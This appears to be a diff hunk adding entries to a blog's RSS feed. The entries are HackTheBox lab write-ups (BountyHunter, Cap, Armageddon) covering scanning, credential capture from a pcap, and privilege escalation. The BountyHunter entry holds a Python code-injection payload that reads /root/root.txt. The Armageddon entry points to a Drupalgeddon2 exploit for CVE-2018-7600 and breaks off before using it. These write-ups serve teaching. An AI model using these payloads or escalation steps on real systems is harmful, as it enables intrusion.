+&lt;li&gt;returns &lt;code&gt;False&lt;/code&gt; whether the first line doesn&amp;rsquo;t start with &lt;code&gt;# Skytrain Inc&lt;/code&gt; or &lt;code&gt;## Ticket to&lt;/code&gt;; otherwise, prints the destination and continues.&lt;/li&gt;
+&lt;li&gt;reads the string below &amp;ldquo;__Ticket Code:__&amp;rdquo;, removes (**) and thereafter assigns the number before the (+) operator as&lt;code&gt;ticketCode&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Executes the following string as code whether the modulo of &lt;code&gt;ticketCode&lt;/code&gt; and 7 is 4.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Hence, our &lt;code&gt;root_ticket.md&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; Skytrain Inc
+&lt;span style=&#34;color:#75715e&#34;&gt;## Ticket to New Haven&lt;/span&gt;
+__Ticket Code:__
+**32+100 and __import__&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;os&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.system&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cat /root/root.txt&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;##Issued: 2021/10/03&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#End Ticket&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_17-13.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>HackTheBox: Cap</title>
+      <link>/posts/htb-cap/</link>
+      <pubDate>Fri, 01 Oct 2021 09:30:00 +1345</pubDate>
+      
+      <guid>/posts/htb-cap/</guid>
+      <description>Hello everyone, while preparing chapters of the book Practical Reverse Engineering, I occasionally got bored and wanted to do something else to have my mind a reboot. That is the reason why we are here solving Cap - another HackTheBox easy machine.
+So yeah, hope you enjoy.
+Enumeration As usual, we wanted to start our enumeration step with nmap.
+┌──(kali㉿kali)-[~/Desktop/HTB/Boxes/Cap] └─$ cat nmap/Cap.nmap # Nmap 7.91 scan initiated Thu Sep 30 21:54:00 2021 as: nmap -sS -sV -sC -p- -oA nmap/Cap 10.</description>
+      <content>&lt;p&gt;Hello everyone, while preparing chapters of the book Practical Reverse Engineering, I occasionally got bored and wanted to do something else to have my mind a reboot. That is the reason why we are here solving Cap - another HackTheBox easy machine.&lt;/p&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;p&gt;So yeah, hope you enjoy.&lt;/p&gt;
+&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
+&lt;p&gt;As usual, we wanted to start our enumeration step with &lt;a href=&#34;https://nmap.org/&#34;&gt;nmap&lt;/a&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Desktop/HTB/Boxes/Cap&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ cat nmap/Cap.nmap
+&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap 7.91 scan initiated Thu Sep 30 21:54:00 2021 as: nmap -sS -sV -sC -p- -oA nmap/Cap 10.10.10.245&lt;/span&gt;
+Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.10.245
+Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.054s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;65532&lt;/span&gt; closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;3072&lt;/span&gt; fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+80/tcp open  http    gunicorn
+| fingerprint-strings: 
+	...
+|_http-server-header: gunicorn
+|_http-title: Security Dashboard
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap done at Thu Sep 30 21:56:34 2021 -- 1 IP address (1 host up) scanned in 153.60 seconds&lt;/span&gt;
+                                   
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The output was simplified as we just needed to focus on those SSH, FTP and HTTP service ports. I also tried enumerating them with CrackMapExec but nothing was found since neither their SSH nor FTP was any low-hanging fruit at all.&lt;/p&gt;
+&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
+&lt;h3 id=&#34;from-pcap-to-user-access&#34;&gt;From PCAP to user access&lt;/h3&gt;
+&lt;p&gt;Visiting the webpage gave us a small hint about the username.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-01-HTB-Cap/image-20211001113218536.png&#34; alt=&#34;image-20211001113218536&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The top-left dropdown provided us with three features and only the second, &lt;em&gt;Security Snapshot Analysis&lt;/em&gt;, that I considered abusable whereas the other two were just outputs from &lt;code&gt;ifconfig&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-01-HTB-Cap/image-20211001113725814.png&#34; alt=&#34;image-20211001113725814&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The second option redirected the user to an endpoint of downloadable Wireshark data separated by IDs: &lt;code&gt;http://10.10.10.245/data/[ID]&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-01-HTB-Cap/image-20211001114211478.png&#34; alt=&#34;image-20211001114211478&#34;&gt;&lt;/p&gt;
+&lt;p&gt;With this type of situation, let&amp;rsquo;s have &lt;a href=&#34;https://tools.kali.org/web-applications/dirb&#34;&gt;dirb&lt;/a&gt; doing its job.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ dirb http://10.10.10.245/data/ /usr/share/wordlists/dirb/common.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And we got expected result:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-01-HTB-Cap/image-20211001115207758.png&#34; alt=&#34;image-20211001115207758&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Except &lt;code&gt;0.pcap&lt;/code&gt; from &lt;code&gt;http://10.10.10.245/data/0&lt;/code&gt; or &lt;code&gt;00&lt;/code&gt;, all data of other IDs seemed to be empty.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-01-HTB-Cap/image-20211001121045966.png&#34; alt=&#34;image-20211001121045966&#34;&gt;&lt;/p&gt;
+&lt;p&gt;After downloading, we could inspect the .PCAP file with &lt;a href=&#34;https://www.wireshark.org/&#34;&gt;Wireshark&lt;/a&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Desktop/HTB/Boxes/Cap&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ wireshark 0.pcap&amp;amp;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Scrolled down a little around FTP protocol then you would be able to grab our user&amp;rsquo;s credentials.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-01-HTB-Cap/2021-10-01_12-29.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;With the newly found username and password, let&amp;rsquo;s try logging in to the remote target via SSH and FTP.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-01-HTB-Cap/2021-10-01_12-43.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Same credentials also worked for SSH.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-01-HTB-Cap/2021-10-01_16-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;You can see that someone else had been here before us and dropped their enumeration script (linpeas.sh) here. Since &lt;code&gt;sudo -l&lt;/code&gt; is not allowed for user &lt;code&gt;nathan&lt;/code&gt;, I also started a LinPEAS instance and streamed it back to my Linux.&lt;/p&gt;
+&lt;h3 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h3&gt;
+&lt;p&gt;The script resulted with an infamous &lt;code&gt;python3.8&lt;/code&gt; capability vector.&lt;/p&gt;
+&lt;p&gt;Capabilities are those permissions that divide the privileges of kernel user or kernel level programs into small pieces so that a process can be allowed sufficient power to perform specific privileged tasks.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-01-HTB-Cap/2021-10-01_16-25.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;On account of the &lt;code&gt;cap_setuid&lt;/code&gt; capability, one can temporarily execute a program/file with dedicated privilege. In our case, I spawned a shell with root id and was then able to read the final flag.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-01-HTB-Cap/2021-10-01_16-32.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>HackTheBox: Armageddon</title>
+      <link>/posts/htb-armageddon/</link>
+      <pubDate>Fri, 28 May 2021 09:30:00 +1345</pubDate>
+      
+      <guid>/posts/htb-armageddon/</guid>
+      <description>This is another challenge on HackTheBox - Armageddon. Let&amp;rsquo;s get started.
+Enumeration Nmap We start by enumerating open ports and services on the target machine using nmap:
+┌──(root💀kali)-[/home/kali/HackTheBox/Armageddon] └─# cat nmap/armageddon.nmap # Nmap 7.91 scan initiated Thu May 27 00:25:58 2021 as: nmap -sS -sC -sV -p- -oA nmap/armageddon -v 10.10.10.233 Nmap scan report for 10.10.10.233 Host is up (0.23s latency). Not shown: 65219 closed ports, 314 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.</description>
+      <content>&lt;p&gt;This is another challenge on HackTheBox - Armageddon. Let&amp;rsquo;s get started.&lt;/p&gt;
+&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
+&lt;h3 id=&#34;nmap&#34;&gt;Nmap&lt;/h3&gt;
+&lt;p&gt;We start by enumerating open ports and services on the target machine using &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root💀kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;/home/kali/HackTheBox/Armageddon&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─# cat nmap/armageddon.nmap 
+&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap 7.91 scan initiated Thu May 27 00:25:58 2021 as: nmap -sS -sC -sV -p- -oA nmap/armageddon -v 10.10.10.233&lt;/span&gt;
+Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.10.233
+Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.23s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;65219&lt;/span&gt; closed ports, &lt;span style=&#34;color:#ae81ff&#34;&gt;314&lt;/span&gt; filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.6 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;CentOS&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; PHP/5.4.16&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D
+|_http-generator: Drupal &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;http://drupal.org&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt; disallowed entries &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; shown&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Apache/2.4.6 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;CentOS&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; PHP/5.4.16
+|_http-title: Welcome to  Armageddon |  Armageddon
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap done at Thu May 27 01:24:56 2021 -- 1 IP address (1 host up) scanned in 3538.09 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;There are two open ports which are SSH on &lt;code&gt;22&lt;/code&gt; and Apache web server on &lt;code&gt;80&lt;/code&gt;. The OpenSSH is usually not exploitable so we should focus on its web server.&lt;/p&gt;
+&lt;p&gt;The homepage includes a login form and allows us to create new accounts but it seems to be not working as the new account needs to get approval from the administrator. Also, the request new password feature is only available for existing users.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-12.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;gobuster&#34;&gt;GoBuster&lt;/h3&gt;
+&lt;p&gt;I decide to use &lt;code&gt;gobuster&lt;/code&gt; to try finding more accessible objects on the web server. These results are most likely to give us a hint about what we have to do next.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root💀kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;/home/kali/HackTheBox/Armageddon&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─# gobuster dir -q -u http://10.10.10.233/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak -t &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; -o gobuster.txt
+/index.php            &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 7440&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+/misc                 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 233&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.10.233/misc/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+/themes               &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 235&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.10.233/themes/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+/modules              &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 236&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.10.233/modules/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+/scripts              &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 236&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.10.233/scripts/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+/sites                &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 234&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.10.233/sites/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;  
+/includes             &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 237&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.10.233/includes/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+/install.php          &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 3172&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;                                   
+/profiles             &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 237&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.10.233/profiles/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+/update.php           &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 403&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 4057&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;                                   
+/README.txt           &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 5382&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;                                   
+/robots.txt           &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 2189&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;                                   
+/cron.php             &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 403&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 7388&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;                                   
+/INSTALL.txt          &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 17995&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;                                  
+/LICENSE.txt          &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 18092&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;                                  
+/CHANGELOG.txt        &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 111613&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;                                 
+/xmlrpc.php           &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 42&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;                                     
+/COPYRIGHT.txt        &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 1481&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;  
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
+&lt;p&gt;After some glances through all the folders and files, I bump into some information about &lt;em&gt;Drupal&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-13.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;As in the &lt;code&gt;README.txt&lt;/code&gt; and &lt;a href=&#34;https://www.drupal.org/&#34;&gt;their website&lt;/a&gt;, Drupal is simply an open-source CMS platform. This revealed Drupal to be our exploit target but we have to know about the version of Drupal the machine is using.&lt;/p&gt;
+&lt;p&gt;And we can get it by reading &lt;code&gt;Changelog.txt&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-14.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;So the version is 7.56, while searching on Google about its vulnerability, I found this &lt;a href=&#34;https://github.com/dreadlocked/Drupalgeddon2&#34;&gt;Github repo&lt;/a&gt; would provide us a handy boost.&lt;/p&gt;
+&lt;h3 id=&#34;reverse-shell-with-drupalgeddon2&#34;&gt;Reverse shell with Drupalgeddon2&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-15.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Some brief information about CVE-2018-7600/SA-CORE-2018-002 and you can learn more about it &lt;a href=&#34;https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;To provide some background, Drupal’s Form API was introduced in Drupal 6 and allowed alteration of the form data during the form rendering process. This revolutionized the way markup processing was done.&lt;/p&gt;
+&lt;p&gt;In Drupal 7 the Form API was generalized to what is now known as &lt;em&gt;Renderable Arrays&lt;/em&gt;. This extended API is used to represent the structure of most of the UI elements in Drupal, such as pages, blocks, nodes and more.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Basically it tampers malfunctioned data into the form and abuses the rendering markup process to achieve RCE.&lt;/p&gt;
+&lt;p&gt;That&amp;rsquo;s all about the concept and definition, let&amp;rsquo;s just use the automated script to exploit the target machine.&lt;/p&gt;
